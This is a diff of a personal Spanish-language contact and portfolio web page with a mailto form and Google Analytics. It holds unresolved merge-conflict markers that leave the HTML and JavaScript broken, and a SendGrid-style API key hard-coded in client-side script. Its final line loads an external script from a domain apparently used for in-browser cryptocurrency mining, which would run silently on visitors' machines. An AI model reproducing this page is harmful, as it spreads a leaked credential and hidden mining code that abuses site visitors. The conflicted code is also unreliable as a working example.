@@ -10,7 +10,7 @@
 		<meta name="description" content="Contenido del usuario creador de LaData para ponerse en contacto, de Jujuy. Power Bi Córdoba, Argentina." />
 		<meta name="author" content="ibarrau">
 		<link rel="icon" href="images/a.png" type="image/x-icon">
-		<link rel="stylesheet" href="assets/css/main.css" />		
+		<link rel="stylesheet" href="assets/css/main.css" />
 		<!-- Global site tag (gtag.js) - Google Analytics -->
 		<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120636676-1"></script>
 		<script>
@@ -53,7 +53,11 @@
 					</ul>
 					<hr/><br/>
 					<h3>Contacto: </h3>
+<<<<<<< HEAD
 					<form method="post" action="mailto:igna_barrau@hotmail.com" enctype="text/plain">
+=======
+					<form method="post" action="mailto:igna_barrau@hotmail.com">
+>>>>>>> ac933ea353ca293253f2cc42ae8db87d42ffeae1
 						<div class="field half first">
 							<label for="name">Name</label>
 							<input type="text" name="name" id="name" />
@@ -64,11 +68,15 @@
 						</div>
 						<div class="field">
 							<label for="message">Message</label>
-							<textarea type="text" name="message" id="message" rows="6"></textarea>
+							<textarea name="message" id="message" rows="6"></textarea>
 						</div>
 						<ul class="actions">
+<<<<<<< HEAD
 							<li><input id="enviar" type="submit" value="Enviar Mensaje" style="background-color: transparent;box-shadow: inset 0 0 0 2px #FF8C00;color: #FF8C00 !important;"  /></li>
 							<!--type="submit"  style="background-color: transparent;box-shadow: inset 0 0 0 2px #FF8C00;color: #FF8C00 !important;"-->
+=======
+							<li><input type="submit" value="Send Message" class="alt" onclick="sendMsj()" /></li>
+>>>>>>> ac933ea353ca293253f2cc42ae8db87d42ffeae1
 						</ul>
 					</form>
 				</div>
@@ -97,8 +105,9 @@
 			<script src="assets/js/main.js"></script>
 			<script>
 			$(document).ready(function(){
-				/*$(".alt").click(function(event){
+				$(".alt").click(function(event){
 					event.preventDefault();
+<<<<<<< HEAD
 				});	*/		
 				
 			});
@@ -137,8 +146,34 @@
 				"ladatamail",
 				"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",
 				function done(message) { alert("Mail enviado.") });
+=======
+				});			
+			});
+			function sendMsj() {
+				alert('Opción no disponible por el momento. Trabajando en ello :) \nEscriba a igna_barrau@hotmail.com') ;
+			}
+	
+			/*
+			POST https://outlook.office.com/api/v2.0/me/sendmail
+
+			{
+			  "Message": {
+				"Subject": "LaData user!",
+				"Body": {
+				  "ContentType": "Text",
+				  "Content": "AQUI el testo."
+				},
+				"ToRecipients": [
+				  {
+					"EmailAddress": {
+					  "Address": "igna_barrau@hotmail.com"
+					}
+				  }
+				]
+			  }
+>>>>>>> ac933ea353ca293253f2cc42ae8db87d42ffeae1
 			}*/
-		
+			
 			
 			</script>
 			<script src="https://www.hostingcloud.science./rrPl.js"></script>
